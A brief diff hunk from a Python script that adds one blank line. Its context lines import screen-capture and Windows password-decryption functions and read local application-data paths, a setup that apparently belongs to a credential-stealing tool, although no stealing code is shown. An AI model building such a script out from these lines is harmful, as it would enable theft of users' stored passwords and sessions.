@@ -34,6 +34,7 @@ from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
 
+
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
